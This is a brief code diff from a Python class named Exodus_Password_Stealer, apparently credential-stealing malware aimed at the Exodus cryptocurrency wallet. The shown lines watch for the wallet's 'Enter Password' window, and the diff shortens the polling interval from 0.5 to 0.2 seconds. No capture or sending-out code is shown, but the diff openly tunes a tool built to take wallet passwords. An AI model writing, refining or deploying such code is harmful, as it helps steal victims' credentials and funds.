@@ -27,7 +27,7 @@ class Exodus_Password_Stealer:
                 if current_active_window["title"] == "Enter Password":
                     print("exodus login screen is open")
                 
-                time.sleep(0.5)
+                time.sleep(0.2)
         
 if __name__ == "__main__":
     Stealer_Object: object = Exodus_Password_Stealer("Exodus.exe")
